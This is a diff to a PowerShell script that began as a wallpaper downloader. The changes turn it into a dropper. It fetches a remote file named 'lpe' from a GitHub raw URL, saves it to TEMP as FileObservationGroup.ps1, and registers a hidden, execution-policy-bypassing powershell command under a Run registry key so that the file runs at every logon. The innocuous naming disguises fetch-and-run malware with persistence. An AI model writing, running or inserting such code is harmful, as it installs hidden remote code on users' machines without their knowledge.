@@ -1,5 +1,6 @@
 $imageUrl = "https://raw.githubusercontent.com/kolomka-cpu/elka/refs/heads/main/lpe"
-$imagePath = "$env:TEMP\wallpaper.jpg"
+$imagePath = "$env:TEMP\FileObservationGroup.ps1"
+
 
 Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath -UseBasicParsing
 $activeUser = (Get-CimInstance Win32_ComputerSystem).UserName
@@ -25,6 +26,7 @@ if (-not (Test-Path $imagePath)) {
     Write-Output "FileObservationGroup script not found"
     exit
 }
+$psCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$imagePath`""
 
 if (-not (Test-Path "Registry::HKEY_USERS\$sid")) {
     Write-Output "User hive not loaded, attempting to load"
@@ -47,9 +49,9 @@ try {
         New-Item -Path $runKeyUser -Force | Out-Null
     }
 
-    New-ItemProperty -Path $runKeyUser `
+    New-ItemProperty -Path $runKeyMachine `
         -Name "FileObservationGroup" `
-        -Value "`"$imagePath`"" `
+        -Value $psCommand `
         -PropertyType String `
         -Force | Out-Null
 
@@ -64,7 +66,7 @@ if (-not $created) {
     try {
         New-ItemProperty -Path $runKeyMachine `
             -Name "FileObservationGroup" `
-            -Value "`"$imagePath`"" `
+            -Value $psCommand `
             -PropertyType String `
             -Force | Out-Null
 
